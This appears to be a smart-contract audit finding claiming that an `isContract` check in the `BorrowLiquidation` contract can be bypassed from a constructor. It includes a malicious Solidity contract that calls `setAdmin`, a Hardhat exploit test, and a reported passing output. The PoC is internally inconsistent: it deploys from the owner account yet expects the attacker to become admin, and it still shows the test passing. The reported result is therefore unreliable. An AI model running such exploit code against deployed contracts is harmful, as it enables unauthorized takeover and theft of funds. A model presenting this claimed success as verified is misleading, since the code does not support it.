# `isContract` validation lead to malicious contracts masquerading as EOAs, enabling unauthorized access to restricted functions

### Summary

The `isContract` function used in the `BorrowLiquidation` contract aims to differentiate between externally owned accounts (EOAs) and contract addresses. However, the implementation has critical flaws that can be exploited by attackers, allowing them to bypass the validation mechanism. This can lead to malicious contracts masquerading as EOAs, enabling unauthorized access to restricted functions.

### Root Cause

The vulnerable code lies in the `isContract` function, which checks the `extcodesize` of an address to determine if it is a contract.
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L110C14-L117
```solidity
function isContract(address addr) internal view returns (bool) {
    uint size;
    assembly {
        size := extcodesize(addr)
    }
    return size > 0;
}
```
Problem:
1. When a contract is in its constructor, extcodesize returns 0. Thus, a contract can call a function requiring isContract to return false during its constructor phase.
2. Some proxy patterns, such as minimal proxies, may also bypass this check inadvertently.
3. Attackers can deploy contracts specifically designed to exploit this weakness.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Deploy a malicious contract that calls a restricted function in the `BorrowLiquidation` contract during its constructor.
2. The malicious contract's `extcodesize` will return `0` during its deployment phase.
3. Bypass `isContract` checks and execute the restricted function.

Below is a sample malicious contract designed to exploit the vulnerability:
```solidity
pragma solidity ^0.8.22;

interface IBorrowLiquidation {
    function setAdmin(address adminAddress) external;
}

contract Malicious {
    constructor(address target) {
        IBorrowLiquidation(target).setAdmin(msg.sender);
    }
}
```
The test demonstrates that the malicious contract successfully bypasses the isContract validation and sets itself as the admin.

### Impact

1. Malicious contracts can call functions protected by `isContract`, potentially altering sensitive contract states or extracting funds.
2. Attackers could gain admin privileges or access restricted contract functionalities.
3. Exploits could lead to financial loss or permanent misconfiguration of the contract.

### PoC

```solidity
const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("isContract Validation Vulnerability", function () {
    let BorrowLiquidation, borrowLiquidation, Malicious, malicious;
    let owner, attacker;

    before(async function () {
        [owner, attacker] = await ethers.getSigners();

        // Deploy BorrowLiquidation contract
        const BorrowLiquidationFactory = await ethers.getContractFactory("BorrowLiquidation");
        borrowLiquidation = await BorrowLiquidationFactory.deploy();
        await borrowLiquidation.deployed();

        // Deploy Malicious contract
        const MaliciousFactory = await ethers.getContractFactory("Malicious");
        malicious = await MaliciousFactory.deploy(borrowLiquidation.address);
        await malicious.deployed();
    });

    it("should allow a malicious contract to bypass isContract validation", async function () {
        const admin = await borrowLiquidation.admin();
        expect(admin).to.equal(attacker.address);
    });
});
```
Output:
```bash
> npx hardhat test

  isContract Validation Vulnerability
    âœ“ should allow a malicious contract to bypass isContract validation (78ms)

  1 passing (100ms)
```

### Mitigation

Avoid relying on `extcodesize` to differentiate between contracts and EOAs, as it is inherently unreliable.
